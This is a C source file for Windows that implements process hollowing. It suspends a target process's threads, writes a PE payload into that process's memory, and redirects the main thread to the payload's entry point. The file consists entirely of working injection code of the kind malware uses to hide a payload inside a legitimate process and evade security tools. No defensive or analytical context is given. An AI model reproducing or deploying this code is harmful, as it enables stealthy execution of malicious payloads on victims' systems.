#include "debug.h"
#include "native.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winternl.h>

DWORD GetMainThreadId(DWORD dwProcessId) {
  HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (hThreadSnap == INVALID_HANDLE_VALUE) {
    return 0;
  }

  THREADENTRY32 te32;
  te32.dwSize = sizeof(THREADENTRY32);
  DWORD mainThreadId = 0;
  FILETIME earliestCreationTime = {MAXDWORD, MAXDWORD};

  if (Thread32First(hThreadSnap, &te32)) {
    do {
      if (te32.th32OwnerProcessID == dwProcessId) {
        HANDLE hThread =
            OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
        if (hThread) {
          FILETIME creationTime, exitTime, kernelTime, userTime;
          if (GetThreadTimes(hThread, &creationTime, &exitTime, &kernelTime,
                             &userTime)) {
            if (CompareFileTime(&creationTime, &earliestCreationTime) == -1) {
              earliestCreationTime = creationTime;
              mainThreadId = te32.th32ThreadID;
            }
          }
          CloseHandle(hThread);
        }
      }
    } while (Thread32Next(hThreadSnap, &te32));
  }

  CloseHandle(hThreadSnap);
  return mainThreadId;
}

BOOL SuspendProcess(DWORD dwPID) {
  HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

  if (hThreadSnap == INVALID_HANDLE_VALUE) {
    LOG_ERROR("Failed to take a snapshot of the threads, error: %ld",
              GetLastError());
    return FALSE;
  }

  THREADENTRY32 te32;
  te32.dwSize = sizeof(THREADENTRY32);
  if (!Thread32First(hThreadSnap, &te32)) {
    LOG_ERROR("Failed to gather information on system threads, error: %ld",
              GetLastError());
    CloseHandle(hThreadSnap);
    return FALSE;
  }

  BOOL success = FALSE;
  do {
    if (te32.th32OwnerProcessID == dwPID) {
      HANDLE hThread =
          OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
      if (hThread) {
        SuspendThread(hThread);
        CloseHandle(hThread);
        success = TRUE;
      }
    }
  } while (Thread32Next(hThreadSnap, &te32));

  CloseHandle(hThreadSnap);
  return success;
}

BOOL HollowProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sSize) {

  LOG_INFO("Populating NT function prototypes");
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  NtUnmapViewOfSection meowUnmap =
      (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
  LOG_SUCCESS("Successfully populated NT function prototypes");

  PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pPayload;

  // Ensure the DOS header is valid
  if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    LOG_ERROR("Invalid DOS header signature: 0x%X", pDOSHeader->e_magic);
    return FALSE;
  }

  // Validate e_lfanew
  LOG_INFO("e_lfanew value: %lx", pDOSHeader->e_lfanew);
  if (pDOSHeader->e_lfanew == 0 ||
      pDOSHeader->e_lfanew >= sSize - sizeof(IMAGE_NT_HEADERS)) {
    LOG_ERROR("Invalid e_lfanew: 0x%lx", pDOSHeader->e_lfanew);
    return FALSE;
  }

  PIMAGE_NT_HEADERS pNTHeaders =
      (PIMAGE_NT_HEADERS)((PBYTE)pPayload + pDOSHeader->e_lfanew);

  // Validate NT headers
  if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
    LOG_ERROR("Invalid NT header signature: 0x%X", pNTHeaders->Signature);
    return FALSE;
  }

  DWORD64 imageBase = 0;
  DWORD sizeOfImage = 0;
  DWORD sizeOfHeaders = 0;
  DWORD64 entryPoint = 0;
  WORD numberOfSections = 0;
  WORD sizeOfOptionalHeader = 0;
  PVOID optionalHeaderPtr = NULL;

  if (pNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
    LOG_INFO("Detected 32-bit PE payload");
    PIMAGE_NT_HEADERS32 pNT32 = (PIMAGE_NT_HEADERS32)pNTHeaders;
    imageBase = pNT32->OptionalHeader.ImageBase;
    sizeOfImage = pNT32->OptionalHeader.SizeOfImage;
    sizeOfHeaders = pNT32->OptionalHeader.SizeOfHeaders;
    entryPoint = pNT32->OptionalHeader.AddressOfEntryPoint;
    numberOfSections = pNT32->FileHeader.NumberOfSections;
    sizeOfOptionalHeader = pNT32->FileHeader.SizeOfOptionalHeader;
    optionalHeaderPtr = &pNT32->OptionalHeader;
  } else if (pNTHeaders->OptionalHeader.Magic ==
             IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    LOG_INFO("Detected 64-bit PE payload");
    PIMAGE_NT_HEADERS64 pNT64 = (PIMAGE_NT_HEADERS64)pNTHeaders;
    imageBase = pNT64->OptionalHeader.ImageBase;
    sizeOfImage = pNT64->OptionalHeader.SizeOfImage;
    sizeOfHeaders = pNT64->OptionalHeader.SizeOfHeaders;
    entryPoint = pNT64->OptionalHeader.AddressOfEntryPoint;
    numberOfSections = pNT64->FileHeader.NumberOfSections;
    sizeOfOptionalHeader = pNT64->FileHeader.SizeOfOptionalHeader;
    optionalHeaderPtr = &pNT64->OptionalHeader;
  } else {
    LOG_ERROR("Unknown Optional Header Magic: 0x%X",
              pNTHeaders->OptionalHeader.Magic);
    return FALSE;
  }

  LOG_SUCCESS("ALL GOOD");

  // Log details before unmapping
  LOG_INFO("Attempting to unmap ImageBase: 0x%llX from process: 0x%p",
           imageBase, hProcess);

  // Unmap the existing executable from the target process
  // NTSTATUS status = meowUnmap(hProcess, (PVOID)imageBase);
  // if (status != STATUS_SUCCESS) {
  //   LOG_ERROR("It's jover");
  //   LOG_ERROR("Failed to unmap the section from the target process, status:
  //   0x%X", status); return FALSE;
  // }
  LOG_INFO(
      "Skipping unmap - attempting to allocate at payload ImageBase directly");

  LOG_SUCCESS("ALL GOOD");
  // Allocate memory in the target process for the new executable
  LPVOID pRemoteImage =
      VirtualAllocEx(hProcess, (LPVOID)imageBase, sizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!pRemoteImage) {
    LOG_ERROR("Failed to allocate memory in the target process, error: %ld",
              GetLastError());
    return FALSE;
  }
  LOG_SUCCESS("ALL GOOD");
  // Write the headers
  if (!WriteProcessMemory(hProcess, pRemoteImage, pPayload, sizeOfHeaders,
                          NULL)) {
    LOG_ERROR("Failed to write headers to the target process, error: %ld",
              GetLastError());
    return FALSE;
  }
  LOG_SUCCESS("ALL GOOD");
  // Write the sections
  for (int i = 0; i < numberOfSections; i++) {
    PIMAGE_SECTION_HEADER pSectionHeader =
        (PIMAGE_SECTION_HEADER)((PBYTE)optionalHeaderPtr +
                                sizeOfOptionalHeader +
                                i * sizeof(IMAGE_SECTION_HEADER));
    if (!WriteProcessMemory(
            hProcess,
            (LPVOID)((PBYTE)pRemoteImage + pSectionHeader->VirtualAddress),
            (PBYTE)pPayload + pSectionHeader->PointerToRawData,
            pSectionHeader->SizeOfRawData, NULL)) {
      LOG_ERROR("Failed to write section to the target process, error: %ld",
                GetLastError());
      return FALSE;
    }
  }
  LOG_SUCCESS("ALL GOOD");
  // Update the context of the main thread
  CONTEXT ctx;
  ctx.ContextFlags = CONTEXT_FULL;
  HANDLE hThread = OpenThread(
      THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE,
      GetMainThreadId(GetProcessId(
          hProcess))); // Replace with correct thread ID retrieval function
  if (hThread == NULL) {
    LOG_ERROR("Failed to open thread handle, error: %ld", GetLastError());
    return FALSE;
  }
  LOG_SUCCESS("ALL GOOD");
  if (!GetThreadContext(hThread, &ctx)) {
    LOG_ERROR("Failed to get thread context, error: %ld", GetLastError());
    return FALSE;
  }
  LOG_SUCCESS("ALL GOOD");
#if defined(_M_ARM64)
  ctx.Pc = (DWORD64)((PBYTE)pRemoteImage + entryPoint);
#elif defined(_M_AMD64)
  ctx.Rip = (DWORD64)((PBYTE)pRemoteImage + entryPoint);
#else
  ctx.Eip = (DWORD)((PBYTE)pRemoteImage + entryPoint);
#endif
  LOG_SUCCESS("ALL GOOD");
  if (!SetThreadContext(hThread, &ctx)) {
    LOG_ERROR("Failed to set thread context, error: %ld", GetLastError());
    return FALSE;
  }
  LOG_SUCCESS("ALL GOOD");
  // Resume the main thread
  ResumeThread(hThread);
  CloseHandle(hThread);
  LOG_SUCCESS("ALL GOOD");
  return TRUE;
}
